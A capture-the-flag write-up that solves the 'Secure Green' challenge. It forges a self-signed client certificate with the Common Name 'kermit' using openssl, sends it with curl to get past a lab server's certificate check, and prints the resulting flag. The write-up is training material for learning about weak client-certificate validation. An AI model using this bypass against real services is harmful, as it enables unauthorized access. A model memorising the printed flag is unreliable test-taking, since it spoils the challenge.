# Secure Green

## Introduction
```
Evil Corp. runs a secret service accessible to authorized personnel only.

According to an inside source, their system administrator is actually a green plush frog with a side gig at Sesame Street... I wonder if he can really configure a server securely.
```

## Goal
```
The goal of this challenge is to gain access to Evil Corps' secret service which is accessible only to authorized personnel.
```

## Task
```
Your task is to find vulnerabilities in the system and exploit them to gain access to the secret service. You must apply your knowledge of web security, network security, and system administration to complete this challenge successfully.
```

## Flag Format
`UUID`

## Writeup

Starting off I send a request to the website. <br/>
```sh
kali@kali curl --insecure https://12e4700b-6ccb-488d-8341-5f47054109f7.rdocker.vuln.land/
The provided CN "" is unknown, Hacking-Lab-Cert has been notified!
```

From the description we can estimate what we need to pass to gain access. <br/>
The first thing which came to my mind is “kermit”. <br/>

Trying to pass `kermit` as a header. <br/>
```sh
kali@kali curl --insecure -H "CN: kermit" https://12e4700b-6ccb-488d-8341-5f47054109f7.rdocker.vuln.land/
The provided CN "" is unknown, Hacking-Lab-CERT has been notified!
```

Trying around some more I didn't find anything of interest. <br/>
One thing I want to try out is making a client ssl certificate using `kermit` as `Common Name`. <br/>
```sh
kali@kali openssl genpkey -algorithm RSA -out client-key.pem
[REDACTED]
kali@kali openssl req -new -key client-key.pem -out client-csr.pem -subj "/CN=kermit"
kali@kali openssl x509 -req -in client-csr.pem -signkey client-key.pem -out client-cert.pem
Certificate request self-signature ok
subject=CN = kermit
```

Making a request using the forged certificate. <br/>
```sh 
kali@kali curl --insecure --cert client-cert.pem --key client-key.pem https://12e4700b-6ccb-488d-8341-5f47054109f7.rdocker.vuln.land/
Great success! Here is your flag: c5fe02e4-dc3c-4bb5-a192-a07b43a451e8
```

Seems like this concludes the challenge.
